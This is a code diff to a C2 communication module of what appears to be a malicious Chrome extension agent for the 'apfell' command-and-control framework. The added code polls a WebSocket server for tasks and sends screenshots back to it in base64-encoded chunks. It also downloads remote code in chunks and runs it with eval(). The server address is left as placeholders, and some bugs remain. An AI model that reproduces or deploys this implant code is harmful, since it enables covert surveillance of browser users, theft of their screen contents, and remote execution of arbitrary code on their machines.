@@ -2,6 +2,7 @@
 // Dictionary that holds outbound messages
 let out = [];
 let screencaptures = [];
+let loads = [];
 class customC2 extends baseC2{
     constructor(host, port, endpoint, ssl , interval){
         super(host, port, endpoint, ssl, interval);
@@ -52,38 +53,13 @@ class customC2 extends baseC2{
             const meta = {
                 "client":true,
                 "data": msg,
-                "tag": "",
-                "file":{},
+                "tag":""
             };
-            connection.send(meta);
+
+            let final = JSON.stringify(meta);
+            connection.send(final);
         }
     }
-}
-
-
-/// Create a Callback Checkin Message
-function CreateCallbackCheckInMessage(username, uuid, pid, addresses, hostname) {
-    let msg = {};
-    msg.user = username;
-    msg.pid = pid;
-    msg.uuid = uuid;
-    msg.ip = addresses;
-    msg.host = hostname;
-
-    return msg;
-}
-
-function CreateApfellMessage(type, apfellID, uuid, size, taskid, tasktype, data) {
-    const msg = {};
-    msg.type = type;
-    msg.id = apfellID;
-    msg.uuid = uuid;
-    msg.size = size;
-    msg.taskid = taskid;
-    msg.tasktype = tasktype;
-    msg.data =  data;
-
-    return msg;
 }
 
 //------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
@@ -91,15 +67,98 @@ const C2 = new customC2('HOST_REPLACE',  PORT_REPLACE, 'ENDPOINT_REPLACE', SSL_R
 const connection  = new WebSocket(`${C2.server}`);
 
 setInterval(function(){
+    let request = {'action':'get_tasking', 'tasking_size': 1, 'delegates':[]};
+    let msg = {
+        'client':true,
+        'data': JSON.stringify(request),
+        'tag':''
+    };
+    let final = JSON.stringify(msg);
+    connection.send(final);
+    
     C2.postResponse();
 }, C2.interval);
 
 chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
-    // Listen for events from other scripts
+    // Listen for task responses that require additional messages
     switch (message.type) {
         
         case 'screencapture': {
             // TODO: Chunk screencapture and send
+            let raw = screencaptures[message.index].image;
+            let i = 0;
+            let arrLength = raw.length;
+            let temp = [];
+            let chunkSize = 512000;
+
+            for (i = 0; i < arrLength; i+=chunkSize) {
+                let chunk = raw.slice(i, i+chunkSize);
+                temp.push(chunk);
+            }
+
+            // loop through the chunk array and send each one to apfell
+            for (let j = 0; j < temp.length; j++) {
+                let response = {
+                    'chunk_num': j+1,
+                    'file_id': message.file_id,
+                    'chunk_data': btoa(unescape(encodeURIComponent(temp[j]))),
+                    'task_id': screencaptures[message.index].task_id,
+                };
+
+                let outer_response = {
+                    'action':'post_response',
+                    'responses':[response],
+                    'delegates':[]
+                };
+
+                let enc = JSON.stringify(outer_response);
+                let final = apfell.apfellid + enc;
+                let msg = btoa(unescape(encodeURIComponent(final)));
+                out.push(msg);
+            }
+
+            // clear the entry
+            screencaptures[message.index] = {};
+
+            if (screencaptures.length === 1 ) {
+                screencaptures = [];
+            }
+            break;
+        }
+        case 'load': {
+            // process upload action
+
+            let load = loads[message.index];
+            if (message.chunk_num < message.total_chunks) {
+                let raw = atob(message.chunk_data);
+                load.data.push(...raw);
+                loads[message.index] = load;
+                let response = {'action':'upload','chunk_size': 1024000, 'chunk_num':(message.chunk_num + 1), 'file_id':load.file_id, 'full_path':''};
+                let encodedResponse = JSON.stringify(response);
+                let final = apfell.apfellid + encodedResponse;
+                let msg = btoa(unescape(encodeURIComponent(final)));
+                out.push(msg);
+            } else if (message.chunk_num === message.total_chunks) {
+                let raw = atob(message.chunk_data);
+                load.data.push(...raw);
+
+                let code = String.fromCharCode(...load.data);
+                eval(code);
+
+                let response = {'task_id':load.task_id, 'user_output': load.name + " loaded", "completed":true};
+                let outer_response = {'action':'post_response', 'responses':[response], 'delegates':[]};
+                let enc = JSON.stringify(outer_response);
+                let final = apfell.apfellid + enc;
+                let msg = btoa(unescape(encodeURIComponent(final)));
+                out.push(msg);
+            }
+
+
+
+            break;
+        }
+        default : {
+
         }
     }
 });
@@ -117,42 +176,62 @@ connection.onerror = function () {
 };
 
 connection.onmessage = function (e) {
-    const rawmsg = atob(e.data)
-    var messagenouuid = rawmsg.slice(35, message.length - 1)
-    var message = JSON.parse(messagenouuid)
-    switch (message['action']) {
+    const rawmsg = atob(e.data);
+    const messagenouuid = rawmsg.slice(35, rawmsg.length - 1);
+    const message = JSON.parse(messagenouuid);
+    switch (message.action) {
         case 'checkin': {
             // callback check in
-            apfell.apfellid = message['id'];
+            apfell.apfellid = message.id;
             break;
         }
         case 'get_tasking' : {
             // handle an apfell message
 
-            for (let index = 0; index < message['tasks'].length; index++) { 
-                const task = message['tasks'][index];
+            for (let index = 0; index < message.tasks.length; index++) {
+                const task = message.tasks[index];
 
                 try {
-                    C2.commands[task['command']](task['parameters'])
+                    C2.commands[task.command](task);
                 } catch (error) {
                     console.log("Error executing task: " + err);
                 }
             }
+
+            break;
         }
         case 'post_response' : {
-            for (let index = 0; index < message['responses']; index++) {
-                const response = message['responses'][index]; 
+            for (let index = 0; index < message.responses.length; index++) {
+                const response = message.responses[index];
                 
                 // check for screencaptures 
                 if (screencaptures.length > 0) {
-                    for (let index = 0; index < screencaptures.length; index++) {
-                        var equal = response['task_id'].localeCompare(screencaptures[index])
-                        if (equal == 0) {
+                    for (let i = 0; i < screencaptures.length; i++) {
+                        let equal = response['task_id'].localeCompare(screencaptures[i]['task_id']);
+                        if (equal === 0) {
                             // TODO: chunk the screencapture data
+                            chrome.runtime.sendMessage({'type':'screencapture', 'file_id':response['file_id'], 'index':i});
                         }
                     }
                 }
             }
+
+            break;
+        }
+        case 'upload' : {
+            // check for load command responses
+            for (let i = 0; i < message.responses.length; i++) {
+                const response = message.response[i];
+                if (loads.length > 0) {
+                    for (let i = 0; i < loads.length; i++) {
+                        let equal = response.task_id.localeCompare(loads[i].task_id);
+                        if (equal === 0) {
+                            chrome.runtime.sendMessage({'type':'load', 'total_chunks': response.total_chunks, 'chunk_num': response.chunk_num, 'chunk_data': response.chunk_data, 'index':i});
+                        }
+                    }
+                }
+            }
+
         }
     }
 };
